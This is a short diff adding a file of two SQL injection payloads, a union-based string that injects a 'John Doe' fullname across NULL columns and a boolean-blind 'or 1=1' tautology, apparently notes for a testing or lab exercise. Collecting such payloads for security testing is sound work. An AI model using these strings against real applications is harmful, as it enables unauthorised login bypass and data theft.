@@ -1,0 +1,4 @@
+union-based:
+'UNION SELECT NULL, NULL, 'John Doe' AS fullname, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL --'
+boolean blind:
+ok' or 1=1 --'
